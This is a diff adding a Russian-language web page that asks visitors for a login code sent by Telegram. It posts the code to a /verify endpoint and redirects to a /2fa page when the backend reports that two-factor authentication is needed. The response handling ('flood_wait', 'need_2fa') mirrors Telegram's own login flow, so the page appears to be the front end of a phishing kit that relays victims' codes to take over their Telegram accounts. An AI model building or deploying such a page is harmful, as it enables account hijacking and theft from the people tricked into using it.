@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Подтверждение кода</title>
+  <link rel="stylesheet" href="/static/style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <img src="/static/logo.png" alt="Logo" class="logo" />
+      <h2>Введите код из Telegram</h2>
+      <form id="verifyForm">
+        <input type="text" id="code" name="code" placeholder="Код подтверждения" required />
+        <button type="submit" id="btn">Подтвердить</button>
+      </form>
+      <p id="error" class="error-text"></p>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("verifyForm");
+    const btn = document.getElementById("btn");
+    const errorText = document.getElementById("error");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const code = document.getElementById("code").value.trim();
+
+      if (!code) return;
+
+      btn.disabled = true;
+      btn.innerText = "⏳ Проверка...";
+
+      try {
+        const res = await fetch("/verify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code }),
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+          btn.innerText = "✅ Успешно";
+          window.location.href = "/success";
+        } else if (data.flood_wait) {
+          btn.innerText = "⛔ Попробуйте позже";
+          errorText.textContent = "Слишком много попыток. Подождите немного.";
+        } else if (data.need_2fa) {
+          window.location.href = "/2fa";
+        } else {
+          btn.innerText = "Ошибка";
+          errorText.textContent = data.message || "Не удалось подтвердить код. Попробуйте снова.";
+        }
+      } catch (err) {
+        btn.innerText = "Ошибка";
+        errorText.textContent = "Не удалось подтвердить код. Проверьте соединение.";
+      }
+
+      btn.disabled = false;
+    });
+  </script>
+</body>
+</html>
